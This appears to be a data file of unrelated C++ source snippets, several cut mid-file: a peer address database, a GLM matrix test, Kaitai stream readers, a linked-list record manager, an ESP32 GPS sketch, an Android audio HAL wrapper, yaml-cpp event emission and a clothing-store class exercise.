stat2H.count,\n//  100.0 * stat8H.reliability, 100.0 * (stat8H.reliability + 1.0 - stat8H.weight), stat8H.count,\n//  100.0 * stat1D.reliability, 100.0 * (stat1D.reliability + 1.0 - stat1D.weight), stat1D.count,\n//  100.0 * stat1W.reliability, 100.0 * (stat1W.reliability + 1.0 - stat1W.weight), stat1W.count);\n}\n\nbool CAddrDb::Get_(CServiceResult &ip, int &wait) {\n  int64 now = time(NULL);\n  int cont = 0;\n  int tot = unkId.size() + ourId.size();\n  if (tot == 0) {\n    wait = 5;\n    return false;\n  }\n  do {\n    int rnd = rand() % tot;\n    int ret;\n    if (rnd < unkId.size()) {\n      set<int>::iterator it = unkId.end(); it--;\n      ret = *it;\n      unkId.erase(it);\n    } else {\n      ret = ourId.front();\n      if (time(NULL) - idToInfo[ret].ourLastTry < MIN_RETRY) return false;\n      ourId.pop_front();\n    }\n    if (idToInfo[ret].ignoreTill && idToInfo[ret].ignoreTill < now) {\n      ourId.push_back(ret);\n      idToInfo[ret].ourLastTry = now;\n    } else {\n      ip.service = idToInfo[ret].ip;\n      ip.ourLastSuccess = idToInfo[ret].ourLastSuccess;\n      break;\n    }\n  } while(1);\n  nDirty++;\n  return true;\n}\n\nint CAddrDb::Lookup_(const CService &ip) {\n  if (ipToId.count(ip))\n    return ipToId[ip];\n  return -1;\n}\n\nvoid CAddrDb::Good_(const CService &addr, int clientV, std::string clientSV, int blocks, uint64_t services) {\n  int id = Lookup_(addr);\n  if (id == -1) return;\n  unkId.erase(id);\n  banned.erase(addr);\n  CAddrInfo &info = idToInfo[id];\n  info.clientVersion = clientV;\n  info.clientSubVersion = clientSV;\n  info.blocks = blocks;\n  info.services = services;\n  info.Update(true);\n  if (info.IsGood() && goodId.count(id)==0) {\n    goodId.insert(id);\n//    printf(\"%s: good; %i good nodes now\\n\", ToString(addr).c_str(), (int)goodId.size());\n  }\n  nDirty++;\n  ourId.push_back(id);\n}\n\nvoid CAddrDb::Bad_(const CService &addr, int ban)\n{\n  int id = Lookup_(addr);\n  if (id == -1) return;\n  unkId.erase(id);\n  CAddrInfo &info = idToInfo[id];\n  info.Update(false);\n  uint32_t now = time(NULL);\n  int ter = info.GetBanTime();\n  if (ter) {\n//    printf(\"%s: terrible\\n\", ToString(addr).c_str());\n    if (ban < ter) ban = ter;\n  }\n  if (ban > 0) {\n//    printf(\"%s: ban for %i seconds\\n\", ToString(addr).c_str(), ban);\n    banned[info.ip] = ban + now;\n    ipToId.erase(info.ip);\n    goodId.erase(id);\n    idToInfo.erase(id);\n  } else {\n    if (/*!info.IsGood() && */ goodId.count(id)==1) {\n      goodId.erase(id);\n//      printf(\"%s: not good; %i good nodes left\\n\", ToString(addr).c_str(), (int)goodId.size());\n    }\n    ourId.push_back(id);\n  }\n  nDirty++;\n}\n\nvoid CAddrDb::Skipped_(const CService &addr)\n{\n  int id = Lookup_(addr);\n  if (id == -1) return;\n  unkId.erase(id);\n  ourId.push_back(id);\n//  printf(\"%s: skipped\\n\", ToString(addr).c_str());\n  nDirty++;\n}\n\n\nvoid CAddrDb::Add_(const CAddress &addr, bool force) {\n  if (!force && !addr.IsRoutable())\n    return;\n  CService ipp(addr);\n  if (banned.count(ipp)) {\n    time_t bantime = banned[ipp];\n    if (force || (bantime < time(NULL) && addr.nTime > bantime))\n      banned.erase(ipp);\n    else\n      return;\n  }\n  if (ipToId.count(ipp)) {\n    CAddrInfo &ai = idToInfo[ipToId[ipp]];\n    if (addr.nTime > ai.lastTry) ai.lastTry = addr.nTime;\n    // Do not update ai.nServices (data from VERSION from the peer itself is better than random ADDR rumours).\n    if (force) {\n      ai.ignoreTill = 0;\n    }\n    return;\n  }\n  CAddrInfo ai;\n  ai.ip = ipp;\n  ai.services = addr.nServices;\n  ai.lastTry = addr.nTime;\n  ai.ourLastTry = 0;\n  ai.total = 0;\n  ai.success = 0;\n  int id = nId++;\n  idToInfo[id] = ai;\n  ipToId[ipp] = id;\n//  printf(\"%s: added\\n\", ToString(ipp).c_str(), ipToId[ipp]);\n  unkId.insert(id);\n  nDirty++;\n}\n\nvoid CAddrDb::GetIPs_(set<CNetAddr>& ips, uint64_t requestedFlags, int max, const bool* nets) {\n  if (goodId.size() == 0) {\n    int id = -1;\n    if (ourId.size() == 0) {\n      if (unkId.size() == 0) return;\n      id = *unkId.begin();\n    } else {\n      id = *ourId.begin();\n    }\n    if (id >= 0 && (idToInfo[id].services & requestedFlags) == requestedFlags) {\n      ips.insert(idToI",
    "#include <glm/gtc/matrix_inverse.hpp>\n#include <glm/gtc/epsilon.hpp>\n\nint test_affine()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::mat3 const M(\n\t\t\t2.f, 0.f, 0.f,\n\t\t\t0.f, 2.f, 0.f,\n\t\t\t0.f, 0.f, 1.f);\n\t\tglm::mat3 const A = glm::affineInverse(M);\n\t\tglm::mat3 const I = glm::inverse(M);\n\t\tglm::mat3 const R = glm::affineInverse(A);\n\n\t\tfor(glm::length_t i = 0; i < A.length(); ++i)\n\t\t{\n\t\t\tError += glm::all(glm::epsilonEqual(M[i], R[i], 0.01f)) ? 0 : 1;\n\t\t\tError += glm::all(glm::epsilonEqual(A[i], I[i], 0.01f)) ? 0 : 1;\n\t\t}\n\t}\n\n\t{\n\t\tglm::mat4 const M(\n\t\t\t2.f, 0.f, 0.f, 0.f,\n\t\t\t0.f, 2.f, 0.f, 0.f,\n\t\t\t0.f, 0.f, 2.f, 0.f,\n\t\t\t0.f, 0.f, 0.f, 1.f);\n\t\tglm::mat4 const A = glm::affineInverse(M);\n\t\tglm::mat4 const I = glm::inverse(M);\n\t\tglm::mat4 const R = glm::affineInverse(A);\n\n\t\tfor(glm::length_t i = 0; i < A.length(); ++i)\n\t\t{\n\t\t\tError += glm::all(glm::epsilonEqual(M[i], R[i], 0.01f)) ? 0 : 1;\n\t\t\tError += glm::all(glm::epsilonEqual(A[i], I[i], 0.01f)) ? 0 : 1;\n\t\t}\n\t}\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_affine();\n\n\treturn Error;\n}\n",
    "#include <kaitai/kaitaistream.h>\n#include <kaitai/exceptions.h>\n\n#if defined(__APPLE__)\n#include <machine/endian.h>\n#include <libkern/OSByteOrder.h>\n#define bswap_16(x) OSSwapInt16(x)\n#define bswap_32(x) OSSwapInt32(x)\n#define bswap_64(x) OSSwapInt64(x)\n#define __BYTE_ORDER    BYTE_ORDER\n#define __BIG_ENDIAN    BIG_ENDIAN\n#define __LITTLE_ENDIAN LITTLE_ENDIAN\n#elif defined(_MSC_VER) // !__APPLE__\n#include <stdlib.h>\n#define __LITTLE_ENDIAN     1234\n#define __BIG_ENDIAN        4321\n#define __BYTE_ORDER        __LITTLE_ENDIAN\n#define bswap_16(x) _byteswap_ushort(x)\n#define bswap_32(x) _byteswap_ulong(x)\n#define bswap_64(x) _byteswap_uint64(x)\n#elif defined(__QNX__) // __QNX__\n#include <sys/param.h>\n#include <gulliver.h>\n#define bswap_16(x) ENDIAN_RET16(x)\n#define bswap_32(x) ENDIAN_RET32(x)\n#define bswap_64(x) ENDIAN_RET64(x)\n#define __BYTE_ORDER    BYTE_ORDER\n#define __BIG_ENDIAN    BIG_ENDIAN\n#define __LITTLE_ENDIAN LITTLE_ENDIAN\n#else // !__APPLE__ or !_MSC_VER or !__QNX__\n#include <endian.h>\n#include <byteswap.h>\n#endif\n\n#include <iostream>\n#include <vector>\n#include <stdexcept>\n\nkaitai::kstream::kstream(std::istream *io) {\n    m_io = io;\n    init();\n}\n\nkaitai::kstream::kstream(const std::string &data) : m_io_str(data) {\n    m_io = &m_io_str;\n    init();\n}\n\nvoid kaitai::kstream::init() {\n    exceptions_enable();\n    align_to_byte();\n}\n\nvoid kaitai::kstream::close() {\n    //  m_io->close();\n}\n\nvoid kaitai::kstream::exceptions_enable() const {\n    m_io->exceptions(\n        std::istream::eofbit |\n        std::istream::failbit |\n        std::istream::badbit\n    );\n}\n\n// ========================================================================\n// Stream positioning\n// ========================================================================\n\nbool kaitai::kstream::is_eof() const {\n    if (m_bits_left > 0) {\n        return false;\n    }\n    char t;\n    m_io->exceptions(std::istream::badbit);\n    m_io->get(t);\n    if (m_io->eof()) {\n        m_io->clear();\n        exceptions_enable();\n        return true;\n    } else {\n        m_io->unget();\n        exceptions_enable();\n        return false;\n    }\n}\n\nvoid kaitai::kstream::seek(uint64_t pos) {\n    m_io->seekg(pos);\n}\n\nuint64_t kaitai::kstream::pos() {\n    return m_io->tellg();\n}\n\nuint64_t kaitai::kstream::size() {\n    std::iostream::pos_type cur_pos = m_io->tellg();\n    m_io->seekg(0, std::ios::end);\n    std::iostream::pos_type len = m_io->tellg();\n    m_io->seekg(cur_pos);\n    return len;\n}\n\n// ========================================================================\n// Integer numbers\n// ========================================================================\n\n// ------------------------------------------------------------------------\n// Signed\n// ------------------------------------------------------------------------\n\nint8_t kaitai::kstream::read_s1() {\n    char t;\n    m_io->get(t);\n    return t;\n}\n\n// ........................................................................\n// Big-endian\n// ........................................................................\n\nint16_t kaitai::kstream::read_s2be() {\n    int16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nint32_t kaitai::kstream::read_s4be() {\n    int32_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 4);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_32(t);\n#endif\n    return t;\n}\n\nint64_t kaitai::kstream::read_s8be() {\n    int64_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 8);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_64(t);\n#endif\n    return t;\n}\n\n// ........................................................................\n// Little-endian\n// ........................................................................\n\nint16_t kaitai::kstream::read_s2le() {\n    int16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nint32_t kaitai::kstream::read_s4le() {\n    int32_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 4);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_32(t);\n#endif\n    return t;\n}\n\nint64_t kaitai::kstream::read_s8le() {\n    int64_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 8);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_64(t);\n#endif\n    return t;\n}\n\n// ------------------------------------------------------------------------\n// Unsigned\n// ------------------------------------------------------------------------\n\nuint8_t kaitai::kstream::read_u1() {\n    char t;\n    m_io->get(t);\n    return t;\n}\n\n// ........................................................................\n// Big-endian\n// ........................................................................\n\nuint16_t kaitai::kstream::read_u2be() {\n    uint16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nuint32_t kaitai::kstream::read_u4be() {\n    uint32_t t;\n    m_io->read(re",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass cms {\r\n    int did;\r\n    long int pno;\r\n    string name;\r\n    float amt;\r\n    cms *next, *pre;\r\n\r\npublic:\r\n    void accept();\r\n    void display();\r\n    void search();\r\n    void update();\r\n    void DELETE();\r\n} *start = nullptr, *end1 = nullptr;\r\n\r\nvoid cms::accept() {\r\n    cms *nn;\r\n    nn = new cms;\r\n    cout << \"Enter the record\" << endl;\r\n    cout << \"DID NAME PH_NO AMT\" << endl;\r\n    cin >> nn->did >> nn->name >> nn->pno >> nn->amt;\r\n    nn->next = nn->pre = nullptr;\r\n    if (start == nullptr) {\r\n        end1 = start = nn;\r\n    } else {\r\n        end1->next = nn;\r\n        nn->pre = end1;\r\n        end1 = nn;\r\n    }\r\n}\r\n\r\nvoid cms::display() {\r\n    cms *temp;\r\n    temp = start;\r\n    if (temp == nullptr) {\r\n        cout << \"LIST IS EMPTY\" << endl;\r\n    } else {\r\n        while (temp != nullptr) {\r\n            cout << temp->did << \"\\t\" << temp->name << \"\\t\" << temp->pno << \"\\t\" << temp->amt << endl;\r\n            temp = temp->next;\r\n        }\r\n    }\r\n}\r\n\r\nvoid cms::search() {\r\n    cms *temp;\r\n    int id;\r\n    int flag = 0;\r\n    temp = start;\r\n    cout << \"Enter the book id which you want to search: \";\r\n    cin >> id;\r\n    while (temp != nullptr) {\r\n        if (temp->did == id) {\r\n            flag = 1;\r\n            cout << \"BOOK IS AVAILABLE\" << endl;\r\n            cout << temp->did << \"\\t\" << temp->name << \"\\t\" << temp->pno << \"\\t\" << temp->amt << endl;\r\n            break;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n    if (flag == 0) {\r\n        cout << \"BOOK IS UNAVAILABLE\" << endl;\r\n    }\r\n}\r\n\r\nvoid cms::update() {\r\n    cms *temp;\r\n    int id;\r\n    int flag = 0;\r\n    temp = start;\r\n    cout << \"Enter the book id which you want to update: \";\r\n    cin >> id;\r\n    while (temp != nullptr) {\r\n        if (temp->did == id) {\r\n            flag = 1;\r\n            cout << \"BOOK IS AVAILABLE\" << endl;\r\n            cout << temp->did << \"\\t\" << temp->name << \"\\t\" << temp->pno << \"\\t\" << temp->amt << endl;\r\n            cin >> temp->did >> temp->name >> temp->pno >> temp->amt;\r\n            break;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n    if (flag == 0) {\r\n        cout << \"BOOK IS UNAVAILABLE\" << endl;\r\n    }\r\n}\r\n\r\nvoid cms::DELETE() {\r\n    int id1;\r\n    cout << \"Enter the id of the record you want to delete: \";\r\n    cin >> id1;\r\n\r\n    if (start == nullptr) {\r\n        cout << \"List is empty. Cannot delete.\" << endl;\r\n        return;\r\n    }\r\n\r\n    cms *temp = start;\r\n\r\n    // Deleting the first node\r\n    if (temp->did == id1) {\r\n        start = start->next;\r\n        if (start != nullptr)\r\n            start->pre = nullptr;\r\n        delete temp;\r\n        cout << \"Record with ID \" << id1 << \" deleted successfully.\" << endl;\r\n        return;\r\n    }\r\n\r\n    // Finding the node to delete\r\n    while (temp != nullptr && temp->did != id1)\r\n        temp = temp->next;\r\n\r\n    if (temp == nullptr) {\r\n        cout << \"Record with ID \" << id1 << \" not found.\" << endl;\r\n        return;\r\n    }\r\n\r\n    // Adjusting pointers to delete the node\r\n    if (temp->pre != nullptr)\r\n        temp->pre->next = temp->next;\r\n    if (temp->next != nullptr)\r\n        temp->next->pre = temp->pre;\r\n\r\n    delete temp;\r\n    cout << \"Record with ID \" << id1 << \" deleted successfully.\" << endl;\r\n}\r\n\r\nint main() {\r\n    int ch;\r\n    do {\r\n        cout << \"MENU\" << endl;\r\n        cout << \"1. accept()\" << endl;\r\n        cout << \"2. display()\" << endl;\r\n        cout << \"3. search()\" << endl;\r\n        cout << \"4. update()\" << endl;\r\n        cout << \"5. DELETE()\" << endl;\r\n        cout << \"6. Exit\" << endl; // Added exit option\r\n        cout << \"Enter your choice: \";\r\n        cin >> ch;\r\n        switch (ch) {\r\n            case 1: {\r\n                cms obj1;\r\n                obj1.accept();\r\n                break;\r\n            }\r\n            case 2:\r\n                cout << \"Display the records\" << endl;\r\n                if (start != nullptr)\r\n                    start->display();\r\n                else\r\n                    cout << \"No records to display\" << endl;\r\n                break;\r\n\r\n            case 3:\r\n                if (start != nullptr)\r\n                    start->search();\r\n                else\r\n                    cout << \"No records to search\" << endl;\r\n                break;\r\n\r\n            case 4:\r\n                if (start != nullptr)\r\n                    start->update();\r\n                else\r\n                    cout << \"No records to update\" << endl;\r\n                break;\r\n\r\n            case 5:\r\n                if (start != nullptr)\r\n                    start->DELETE();\r\n                else\r\n                    cout << \"No records to delete\" << endl;\r\n                break;\r\n\r\n            case 6:\r\n                cout << \"Exiting...\" << endl;\r\n                break;\r\n\r\n            default:\r\n                cout << \"INVALID CHOICE\" << endl;\r\n                break;\r\n        }\r\n    } while (ch != 6);\r\n\u00a0\u00a0\u00a0\u00a0return\u00a00;\r\n}\r\n",
    "\r\n#include <TinyGPSPlus.h>\r\n#include <HardwareSerial.h>\r\n\r\nHardwareSerial SerialPort(1); // use UART1\r\n\r\nTinyGPSPlus gps;\r\n\r\n\r\nvoid displayInfo()\r\n{\r\n  Serial.print(F(\"Location: \")); \r\n  if (gps.location.isValid())\r\n  {\r\n    Serial.print(gps.location.lat(), 6);\r\n    Serial.print(F(\",\"));\r\n    Serial.print(gps.location.lng(), 6);\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\"  Date/Time: \"));\r\n  if (gps.date.isValid())\r\n  {\r\n    Serial.print(gps.date.month());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.day());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.year());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\" \"));\r\n  if (gps.time.isValid())\r\n  {\r\n    if (gps.time.hour() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.hour());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.minute() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.minute());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.second() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.second());\r\n    Serial.print(F(\".\"));\r\n    if (gps.time.centisecond() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.centisecond());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.println();\r\n}\r\n\r\nvoid setup()\r\n{\r\n  Serial.begin(115200);\r\n  SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n\r\n  while(!Serial);\r\n    Serial.println(\"Initializing\");\r\n\r\n  \r\n  delay(5000);\r\n  Serial.println(\"Test\");\r\n\r\n  SerialPort.println(\"$PMTK314,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0*29<CR><LF>\");\r\n\r\n  SerialPort.println(\"$PMTK220,100*2F<CR><LF>\");\r\n  //SerialPort.println(\"$PMTK251,115200*1F<CR><LF>\");\r\n\r\n  //SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n  \r\n}\r\n\r\nvoid loop()\r\n{\r\n  // This sketch displays information every time a new sentence is correctly encoded.\r\n  while (SerialPort.available() > 0)\r\n    Serial.print(char(SerialPort.read()));\r\n    /*gps.encode(SerialPort.read());\r\n\r\n    \r\n    Serial.print(\"LAT=\"); Serial.print(gps.location.lat(), 6);\r\n    Serial.print(\" \");\r\n    Serial.print(\"LNG=\"); Serial.println(gps.location.lng(), 6);\r\n    Serial.println(gps.time.value());\r\n    Serial.println(\"\");\r\n    delay(1000);*/\r\n    \r\n\r\n  /*if (millis() > 5000 && gps.charsProcessed() < 10)\r\n  {\r\n    Serial.println(F(\"No GPS detected: check wiring.\"));\r\n    while(true);\r\n  }*/\r\n}\r\n\r\n",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"PrimaryDeviceHAL\"\n\n#include \"PrimaryDevice.h\"\n#include \"Util.h\"\n\n#if MAJOR_VERSION >= 4\n#include <cmath>\n#endif\n\nnamespace android {\nnamespace hardware {\nnamespace audio {\nnamespace CPP_VERSION {\nnamespace implementation {\n\nnamespace util {\nusing namespace ::android::hardware::audio::CORE_TYPES_CPP_VERSION::implementation::util;\n}\n\nPrimaryDevice::PrimaryDevice(audio_hw_device_t* device) : mDevice(new Device(device)) {}\n\nPrimaryDevice::~PrimaryDevice() {\n    // Do not call mDevice->close here. If there are any unclosed streams,\n    // they only hold IDevice instance, not IPrimaryDevice, thus IPrimaryDevice\n    // \"part\" of a device can be destroyed before the streams.\n}\n\n// Methods from ::android::hardware::audio::CPP_VERSION::IDevice follow.\nReturn<Result> PrimaryDevice::initCheck() {\n    return mDevice->initCheck();\n}\n\nReturn<Result> PrimaryDevice::setMasterVolume(float volume) {\n    return mDevice->setMasterVolume(volume);\n}\n\nReturn<void> PrimaryDevice::getMasterVolume(getMasterVolume_cb _hidl_cb) {\n    return mDevice->getMasterVolume(_hidl_cb);\n}\n\nReturn<Result> PrimaryDevice::setMicMute(bool mute) {\n    return mDevice->setMicMute(mute);\n}\n\nReturn<void> PrimaryDevice::getMicMute(getMicMute_cb _hidl_cb) {\n    return mDevice->getMicMute(_hidl_cb);\n}\n\nReturn<Result> PrimaryDevice::setMasterMute(bool mute) {\n    return mDevice->setMasterMute(mute);\n}\n\nReturn<void> PrimaryDevice::getMasterMute(getMasterMute_cb _hidl_cb) {\n    return mDevice->getMasterMute(_hidl_cb);\n}\n\nReturn<void> PrimaryDevice::getInputBufferSize(const AudioConfig& config,\n                                               getInputBufferSize_cb _hidl_cb) {\n    return mDevice->getInputBufferSize(config, _hidl_cb);\n}\n\n#if MAJOR_VERSION == 2\nReturn<void> PrimaryDevice::openOutputStream(int32_t ioHandle, const DeviceAddress& device,\n                                             const AudioConfig& config, AudioOutputFlags flags,\n                                             openOutputStream_cb _hidl_cb) {\n    return mDevice->openOutputStream(ioHandle, device, config, flags, _hidl_cb);\n}\n\nReturn<void> PrimaryDevice::openInputStream(int32_t ioHandle, const DeviceAddress& device,\n                                            const AudioConfig& config, AudioInputFlags flags,\n                                            AudioSource source, openInputStream_cb _hidl_cb) {\n    return mDevice->openInputStream(ioHandle, device, config, flags, source, _hidl_cb);\n}\n#elif MAJOR_VERSION >= 4\nReturn<void> PrimaryDevice::openOutputStream(int32_t ioHandle, const DeviceAddress& device,\n                                             const AudioConfig& config,\n#if MAJOR_VERSION <= 6\n                                             AudioOutputFlags flags,\n#else\n                                             const AudioOutputFlags& flags,\n#endif\n                                             const SourceMetadata& sourceMetadata,\n                                             openOutputStream_cb _hidl_cb) {\n    return mDevice->openOutputStream(ioHandle, device, config, flags, sourceMetadata, _hidl_cb);\n}\n\nReturn<void> PrimaryDevice::openInputStream(int32_t ioHandle, const DeviceAddress& device,\n                                            const AudioConfig& config,\n#if MAJOR_VERSION <= 6\n                                            AudioInputFlags flags,\n#else\n                                            const AudioInputFlags& flags,\n#endif\n                                            const SinkMetadata& sinkMetadata,\n                                            openInputStream_cb _hidl_cb) {\n    return mDevice->openInputStream(ioHandle, device, config, flags, sinkMetadata, _hidl_cb);\n}\n#endif\n\nReturn<bool> PrimaryDevice::supportsAudioPatches() {\n    return mDevice->supportsAudioPatches();\n}\n\nReturn<void> PrimaryDevice::createAudioPatch(const hidl_vec<AudioPortConfig>& sources,\n                                             const hidl_vec<AudioPortConfig>& sinks,\n                                             createAudioPatch_cb _hidl_cb) {\n    return mDevice->createAudioPatch(sources, sinks, _hidl_cb);\n}\n\nReturn<Result> PrimaryDevice::releaseAudioPatch(int32_t patch) {\n    return mDevice->releaseAudioPatch(patch);\n}\n\nReturn<void> PrimaryDevice::getAudioPort(const AudioPort& port, getAudioPort_cb _hidl_cb) {\n    return mDevice->getAudioPort(port, _hidl_cb);\n}\n\nReturn<Resu",
    "#include \"nodeevents.h\"\r\n#include \"yaml-cpp/eventhandler.h\"\r\n#include \"yaml-cpp/mark.h\"\r\n#include \"yaml-cpp/node/detail/node.h\"\r\n#include \"yaml-cpp/node/detail/node_iterator.h\"\r\n#include \"yaml-cpp/node/node.h\"\r\n#include \"yaml-cpp/node/type.h\"\r\n\r\nnamespace YAML {\r\nvoid NodeEvents::AliasManager::RegisterReference(const detail::node& node) {\r\n  m_anchorByIdentity.insert(std::make_pair(node.ref(), _CreateNewAnchor()));\r\n}\r\n\r\nanchor_t NodeEvents::AliasManager::LookupAnchor(\r\n    const detail::node& node) const {\r\n  auto it = m_anchorByIdentity.find(node.ref());\r\n  if (it == m_anchorByIdentity.end())\r\n    return 0;\r\n  return it->second;\r\n}\r\n\r\nNodeEvents::NodeEvents(const Node& node)\r\n    : m_pMemory(node.m_pMemory), m_root(node.m_pNode), m_refCount{} {\r\n  if (m_root)\r\n    Setup(*m_root);\r\n}\r\n\r\nvoid NodeEvents::Setup(const detail::node& node) {\r\n  int& refCount = m_refCount[node.ref()];\r\n  refCount++;\r\n  if (refCount > 1)\r\n    return;\r\n\r\n  if (node.type() == NodeType::Sequence) {\r\n    for (auto element : node)\r\n      Setup(*element);\r\n  } else if (node.type() == NodeType::Map) {\r\n    for (auto element : node) {\r\n      Setup(*element.first);\r\n      Setup(*element.second);\r\n    }\r\n  }\r\n}\r\n\r\nvoid NodeEvents::Emit(EventHandler& handler) {\r\n  AliasManager am;\r\n\r\n  handler.OnDocumentStart(Mark());\r\n  if (m_root)\r\n    Emit(*m_root, handler, am);\r\n  handler.OnDocumentEnd();\r\n}\r\n\r\nvoid NodeEvents::Emit(const detail::node& node, EventHandler& handler,\r\n                      AliasManager& am) const {\r\n  anchor_t anchor = NullAnchor;\r\n  if (IsAliased(node)) {\r\n    anchor = am.LookupAnchor(node);\r\n    if (anchor) {\r\n      handler.OnAlias(Mark(), anchor);\r\n      return;\r\n    }\r\n\r\n    am.RegisterReference(node);\r\n    anchor = am.LookupAnchor(node);\r\n  }\r\n\r\n  switch (node.type()) {\r\n    case NodeType::Undefined:\r\n      break;\r\n    case NodeType::Null:\r\n      handler.OnNull(Mark(), anchor);\r\n      break;\r\n    case NodeType::Scalar:\r\n      handler.OnScalar(Mark(), node.tag(), anchor, node.scalar());\r\n      break;\r\n    case NodeType::Sequence:\r\n      handler.OnSequenceStart(Mark(), node.tag(), anchor, node.style());\r\n      for (auto element : node)\r\n        Emit(*element, handler, am);\r\n      handler.OnSequenceEnd();\r\n      break;\r\n    case NodeType::Map:\r\n      handler.OnMapStart(Mark(), node.tag(), anchor, node.style());\r\n      for (auto element : node) {\r\n        Emit(*element.first, handler, am);\r\n        Emit(*element.second, handler, am);\r\n      }\r\n      handler.OnMapEnd();\r\n      break;\r\n  }\r\n}\r\n\r\nbool NodeEvents::IsAliased(const detail::node& node) const {\r\n  auto it = m_refCount.find(node.ref());\r\n  return it != m_refCount.end() && it->second > 1;\r\n}\r\n}  // namespace YAML\r\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\n\nusing std::string;\nusing std::vector;\nusing std::find;\nusing std::cout;\nusing std::cin;\nusing std::endl;\n\n// Classe Marca\nclass Marca {\nprivate:\n    string nome;\n\npublic:\n    Marca(const string& nome) : nome(nome) {}\n    ~Marca() {}\n    const string& get_nome() const { return nome; }\n    void set_nome(const string& nome) { this->nome = nome; }\n};\n\n// Classe abstrata de Roupas\nclass Roupa {\nprotected:\n    int id;\n    string tipo;\n    vector<Marca*> marcas;\n    string tamanho;\n\npublic:\n    Roupa(int id, const string& tipo, const string& tamanho) : id(id), tipo(tipo), tamanho(tamanho) {}\n    virtual ~Roupa() {\n        for (auto marca : marcas) {\n            delete marca;\n        }\n    }\n    const string& get_tipo() const { return tipo; }\n    void set_tipo(const string& tipo) { this->tipo = tipo; }\n    const vector<Marca*>& get_marcas() const { return marcas; }\n    void set_marcas(const vector<Marca*>& marcas) { this->marcas = marcas; }\n    const string& get_tamanho() const { return tamanho; }\n    void set_tamanho(const string& tamanho) { this->tamanho = tamanho; }\n    int getId() const { return id; }\n    void setId(int id) { this->id = id; }\n\n    Roupa& operator+(Marca* marcaPtr) {\n        marcas.push_back(marcaPtr);\n        return *this;\n    }\n\n    Roupa& operator-(Marca* marcaPtr) {\n        auto it = find(marcas.begin(), marcas.end(), marcaPtr);\n        if (it!= marcas.end()) {\n            marcas.erase(it);\n        }\n        return *this;\n    }\n\nfriend class Loja;\n};\n\n// Classes RoupaAdulta e RoupaInfantil\nclass RoupaAdulta : public Roupa {\nprivate:\n    string tipoTecido;\n\npublic:\n    RoupaAdulta(int id, const string& tipo, const string& tamanho, const string& tipoTecido): Roupa(id, tipo, tamanho), tipoTecido(tipoTecido) {}\n    ~RoupaAdulta() override {}\n    const string& get_tipoTecido() const { return tipoTecido; }\n    void set_tipoTecido(const string& tipoTecido) { this->tipoTecido = tipoTecido; }\n};\n\nclass RoupaInfantil : public Roupa {\nprivate:\n    string faixaEtaria;\n\npublic:\n    RoupaInfantil(int id, const string& tipo, const string& tamanho, const string& faixaEtaria): Roupa(id, tipo, tamanho), faixaEtaria(faixaEtaria) {}\n    ~RoupaInfantil() override {}\n    const string& get_faixaEtaria() const { return faixaEtaria; }\n    void set_faixaEtaria(const string& faixaEtaria) { this->faixaEtaria = faixaEtaria; }\n};\n\n// Classe Loja\nclass Loja {\nprivate:\n    vector<Roupa*> roupas;\n\npublic:\n   Loja() {}\n   ~Loja() {\n        for (auto roupa : roupas) {\n            delete roupa;\n        }\n    }\n   void adicionar_roupa(Roupa* roupa) { roupas.push_back(roupa); }\n\n   void remover_roupa(int id) {\n    auto it = find_if(roupas.begin(), roupas.end(), [id](Roupa* roupa) { return roupa->id == id; });\n    if (it!= roupas.end()) {\n        delete *it;\n        roupas.erase(it);\n    }\n}\n\n   void operator+=(Roupa* r) {\n        adicionar_roupa(r);\n    }\n\n   void operator-=(Roupa* r) {\n        adicionar_roupa(r);\n    }\n\n   vector<Roupa*>& get_roupas() { return roupas; }\n    \n};\n\nint main() {\n    // Cria uma loja de roupas\n    Loja loja;\n    \n    // Lista de marcas, tipos de roupas e tamanhos\n    vector<string> marcas;\n    